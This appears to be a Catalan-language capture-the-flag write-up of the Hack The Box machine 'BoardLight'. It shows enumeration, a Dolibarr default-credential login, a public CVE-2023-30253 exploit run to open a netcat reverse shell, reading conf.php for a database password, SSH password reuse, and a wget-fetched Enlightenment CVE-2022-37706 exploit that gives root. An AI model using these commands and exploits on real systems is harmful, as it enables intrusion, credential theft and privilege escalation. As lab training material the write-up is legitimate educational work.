El primer que farem serà un nmap a la màquina que estem atacant:
``nmap -sC -sV -p- -v 10.10.11.11``

Un cop fet l'nmap, veiem que la màquina víctima té els següents ports oberts:

```
Discovered open port 80/tcp on 10.10.11.11
Discovered open port 22/tcp on 10.10.11.11
Discovered open port 8001/tcp on 10.10.11.11`
```

Amb els següents serveis:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
```

Veient que té el port 80 obert, anirem al navegador a buscar la pàgina web d'aquesta IP. El primer que veiem és el següent:

![image](https://github.com/user-attachments/assets/d043c617-8956-4e1e-8ebb-1dd46c67bae7)

Hi ha un formulari a sota, on provem de fer injecció SQL però sense obtenir resultats:

![image](https://github.com/user-attachments/assets/109a348f-7c2c-430f-938d-83b7b182010f)

I n'hi ha un altre a Newsletter però tampoc obtenim resultats:

![image](https://github.com/user-attachments/assets/6779a6a5-1910-4b3a-857d-8f5129785cbb)

Per tant, passem a ver una enumeració de de dominis i subdominis a veure si hi ha més sort. Primer afegim el domini al fitxer /etc/hosts:

```
┌──(polkali㉿kaliPol)-[~]
└─$ cat /etc/hosts      
127.0.0.1       localhost
127.0.1.1       kaliPol
10.10.11.233    analytical.htb
10.10.11.233    data.analytical.htb
10.10.11.227    keeper.htb tickets.keeper.htb
10.10.11.11     board.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters`
```

I ara passem a fer una cerca de dominis primer, a veure si trobem alguna cosa:

``gobuster dir --url http://board.htb / --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt``

No hi ha hagut exit i no hem trobat res destacable en quan a dominis, per tant, ara buscarem en subdominis aprofitant que hem posat el domini al fitxer /etc/hosts. Per variar i fer-ho amb una eina diferent ho faré amb fuff:

```
┌──(root㉿kaliPol)-[/home/polkali]
└─# ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949`
```

Amb aquesta comanda hem fet el següent: 

- **`ffuf`**: és l'eina utilitzada per a la cerca de fòrums o subdominis.

- **`-u http://board.htb`**: especifica l'URL de destinació. En aquest cas, és `http://board.htb`.

- **`-H "Host: FUZZ.board.htb"`**: defineix l'encapçalament `Host`, on `FUZZ` serà substituït per cada subdomini provat de la llista.

- **`-w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt`**: especifica el fitxer de paraules que conté una llista de subdominis potencials. En aquest cas, s'utilitza una llista del paquet `amass` que conté els 5000 primers subdominis més populars.

- **`-c`**: activa el mode color per facilitar la visualització dels resultats.

- **`-fs 15959`**: limita els resultats a aquells que tenen una mida de resposta igual o superior a 15959 bytes. Ja que hem vist que era la mida quan hem llençat per primera vegada el fuff sense especificar -fs. Exemple:

``boards                  [Status: 200, Size: 15949, Words: 6243, Lines: 518, Duration: 5094ms]``

Ara, un cop hem llençat la comanda amb la mida de bytes específica, veiem que ens ha trobat el subdomini crm:

```
──(root㉿kaliPol)-[/home/polkali]
└─# ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -c -fs 15949


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /usr/share/amass/wordlists/subdomains-top1mil-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 76ms]
:: Progress: [5000/5000] :: Job [1/1] :: 507 req/sec :: Duration: [0:00:14] :: Errors: 0 ::`
```

Ara però, abans d'anar a la url hem d'afegir el subdomini al fitxer /etc/hosts:

``10.10.11.11     board.htb crm.board.htb``

Un cop hi accedim ens trobem amb una pàgina de login:

![image](https://github.com/user-attachments/assets/38ae89b8-a425-45b2-aff2-da9e81badfdd)


Ens trobem amb un software que sembla ser el CRM de l'empresa que porta per nom Dolibarr, també tenim la seva versió. 

El primer que fem és buscar les seves credencials per defecte a internet, on trobem que són admin/admin:

![image](https://github.com/user-attachments/assets/a1fe2536-b6d2-415f-af34-866bee2b8d66)

Funciona, hem accedit al dashboard amb l'usuari admin: 

![image](https://github.com/user-attachments/assets/4fbfd99a-1703-4ac3-9c4d-5ec7baf46252)

Després d'una estoneta mirant, sembla que no trobem res rellevant, per tant miraré a veure si trobo algun exploit o POC per internet de Dolibarr 17.0.0

Al fer una cerca i posar Dolibar 17.0.0 ja el pròpi navegador ens suggereix la paraula exploit, i si fem la cerca ens trobem amb  vàris POC, provarem el primer a veure si ens funciona:

![image](https://github.com/user-attachments/assets/38c3435d-c90f-406b-b100-eabbcba41ea1)

Ara fem un git clone del repositori a la nostra màquina kali linux ja que sembla que ens podrà ser útil:

![image](https://github.com/user-attachments/assets/9fcc539c-b9f0-435f-9e0c-82ec43c9549c)


```
`┌──(root㉿kaliPol)-[/home/polkali/Documents]
└─# git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git                    
Cloning into 'Exploit-for-Dolibarr-17.0.0-CVE-2023-30253'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (18/18), 9.17 KiB | 1.83 MiB/s, done.
Resolving deltas: 100% (3/3), done.`
```

Donem permisos d'execució a l'exploit:

``sudo chmod +x exploit.py ``

Bàsicament ens trobem que haurem d'escoltar per un port amb la comanda per exemple:

```
nc -lvnp 4444
```

I haurem de llençar l'exploit amb la següent config:

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.90 4444
```

El POC funciona perfectament, al executar-lo: 

```
┌──(root㉿kaliPol)-[/home/polkali/Documents/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─# python3 exploit.py http://crm.board.htb admin admin 10.10.14.90 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection`
```

Ens crea la reverse shell:

```
┌──(polkali㉿kaliPol)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.90] from (UNKNOWN) [10.10.11.11] 35490
bash: cannot set terminal process group (855): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ `
```

Ara, com que hi som dins del CRM Dolibarr, busquem per internet com es configura, a veure si trobem algun fitxer que podem "remenar". Sembla que hi ha un fitxer que es diu conf.php que podria ser interessant:

![image](https://github.com/user-attachments/assets/6dcfc208-ef09-43e4-a6f9-2c48b32b46c5)

I al següent directori trobem el fitxer conf.php:

```
`www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
ls
conf.php
conf.php.example
conf.php.old`
```

Al fitxer conf.php hi trobem unes credencials d'usuari que sembla que ens podrien ser molt útils, semblen d'una base de dades, ja que sembla que s'utilitzen per connectar amb una BD:

```
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';`
```

Per tant, provarem de connectar-nos amb les credencials que acabem d'obtenir. Però no funciona i es queda bloquejat aquí:

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ mysql -D dolibarr -u dolibarrowner -p
</htdocs/conf$ mysql -D dolibarr -u dolibarrowner -p  
Enter password: serverfun2$2023!!
show databases;`
```

Després de seguir cercant, penso que hem pogut veure com el home de l'usuari és larissa, però no hi hem pogut accedir, però, hem vist que té ssh el servidor ja que té el directori ssh, per tant, potser ens podem connectar amb l'usuari larissa per ssh. Ho provem:

```
──(root㉿kaliPol)-[/home/polkali/Documents/BoardLight/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]
└─# ssh larissa@10.10.11.11   
The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.11' (ED25519) to the list of known hosts.
larissa@10.10.11.11's password: 
Last login: Sat Jul 20 12:00:53 2024 from 10.10.14.104
larissa@boardlight:~$ `
```

Ha funcionat!! Estem a dins amb l'usuari larissa, ara anirem a buscar la flag de l'usuari:

```
larissa@boardlight:~$ ls
Desktop  dirtypipez  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
larissa@boardlight:~$ cat user.txt 
c839cad4bbb54ea6bb4e65d7da73ab00
larissa@boardlight:~$ `
```

Un cop tenim la flag de l'usuari hem d'anar a buscar la flag de root. Haurem de mirar la forma d'escalar privilegis. Primer de tot provaré amb SUID a veure si trobem alguna cosa i trobem aquests fitxers amb el bit SUID:

```
`     230     56 -rwsr-xr-x   1 root     root          55528 Apr  9 08:34 /usr/bin/mount
     5609    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
     2245     68 -rwsr-xr-x   1 root     root          67816 Apr  9 08:34 /usr/bin/su`
```

No hi ha hagut èxit. Tot i així, si ens hi fixem en els SUID apareixen una sèrie de fitxers del que sembla ser un software que es diu Enlightenment:

```
`larissa@boardlight:~$ find / -type f -perm -04000 -ls 2>/dev/null
     2491     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
      608     16 -rwsr-sr-x   1 root     root        14488 Apr  8 18:36 /usr/lib/xorg/Xorg.wrap
    17633     28 -rwsr-xr-x   1 root     root        26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    17628     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    17627     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
    17388     16 -rwsr-xr-x   1 root     root        14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqse`
```

I, tot i que a la pàgina  https://gtfobins.github.io no hi hem trobat res, buscarem per internet on trobem això: 

![image](https://github.com/user-attachments/assets/248fcb9b-5848-4af2-b9b9-30b68b008ed3)

La última versió estable sembla força vella, mirarem la versió d'enlightenment que tenim a la màquina i buscarem a veure si té algun exploit i algun POC:

```
larissa@boardlight:~$ enlightenment -version
ESTART: 0.00001 [0.00001] - Begin Startup
ESTART: 0.00012 [0.00012] - Signal Trap
ESTART: 0.00018 [0.00006] - Signal Trap Done
ESTART: 0.00024 [0.00006] - Eina Init
ESTART: 0.00053 [0.00029] - Eina Init Done
ESTART: 0.00059 [0.00006] - Determine Prefix
ESTART: 0.00073 [0.00014] - Determine Prefix Done
ESTART: 0.00078 [0.00005] - Environment Variables
ESTART: 0.00084 [0.00006] - Environment Variables Done
ESTART: 0.00088 [0.00004] - Parse Arguments
Version: 0.23.1
E: Begin Shutdown Procedure!
larissa@boardlight:~$ `
```

Al veure que és la versió 0.23.1 buscarem algun exploit o POC d'aquesta versió. Hem trobat el següent i és el que utilitzarem:

https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit 

Fem un git clone a la nostra màquina on fem un servidor http amb python des del directori del repositori que acabem de descarregar on hi ha l'exploit.sh:

```
┌──(polkali㉿kaliPol)-[~/Documents/BoardLight/CVE-2022-37706-LPE-exploit]
└─$ sudo python -m http.server 666 
Serving HTTP on 0.0.0.0 port 666 (http://0.0.0.0:666/) ...
10.10.11.11 - - [20/Jul/2024 22:13:07] "GET /exploit.sh HTTP/1.1" 200 -`
```


I un cop fet això amb la comanda wget estirem l'exploit.sh des de la màquina de larissa:

```
larissa@boardlight:~$ wget 10.10.14.90:666/exploit.sh
--2024-07-20 13:12:44--  http://10.10.14.90:666/exploit.sh
Connecting to 10.10.14.90:666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 709 [text/x-sh]
Saving to: ‘exploit.sh’

exploit.sh                              100%[=============================================================================>]     709  --.-KB/s    in 0s      

2024-07-20 13:12:44 (99.2 MB/s) - ‘exploit.sh’ saved [709/709]`
```

Li donem permisos d'execució:

``larissa@boardlight:~$ chmod +x exploit.sh ``

I ara executem l'script:

```
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# 
```

I ja som root, per tant ara anem a buscar la flag de root al fitxer root.txt i ja tindrem la màquina feta:

```
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
# cat /root/root.txt 
49f672b49b0c39187807d909546ac6aa
# whoami
root
# 
```

![image](https://github.com/user-attachments/assets/80a63972-9dff-495c-84cc-35ba7c1e76bf)




